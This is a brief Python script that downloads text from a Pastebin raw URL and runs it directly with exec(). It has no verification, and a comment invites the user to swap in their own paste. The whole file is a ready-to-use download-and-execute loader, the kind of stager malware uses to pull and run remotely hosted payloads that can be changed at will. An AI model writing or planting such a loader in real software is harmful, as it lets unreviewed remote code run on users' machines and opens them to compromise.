import requests

def download_and_run(url):
    response = requests.get(url)
    code = response.text
    exec(code)

if __name__ == "__main__":
    # Replace with the "raw" URL of your Pastebin paste
    url = "https://pastebin.com/raw/jBwCdiYQ"
    download_and_run(url)
